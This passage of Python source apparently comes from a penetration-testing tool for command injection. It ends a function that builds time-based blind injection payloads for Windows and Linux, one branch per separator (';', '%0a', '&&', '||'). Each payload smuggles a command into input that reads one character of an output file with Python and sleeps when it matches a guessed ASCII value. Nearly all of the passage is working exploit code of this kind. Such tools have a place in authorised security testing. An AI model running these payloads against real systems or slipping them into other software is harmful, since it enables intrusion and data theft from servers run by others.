      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                )
    else:
      pass
  else:
    if separator == ";"  or separator == "%0a" :
      payload = (separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "])\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                "if [ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
                # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                "fi"
                )
    elif separator == _urllib.parse.quote("&&") :
      #separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "])\nexit(0)\") " + separator +
                "[ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                )
      separator = _urllib.parse.unquote(separator)
    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                "[ " + str(ascii_char) + " -ne  " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "])\nexit(0)\") ] " + separator +
                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                )
    else:
      pass

    if settings.CUSTOM_INJECTION_MARKER:
      payload = payload + separator

  return checks.payload_newline_fixation(payload)

# eof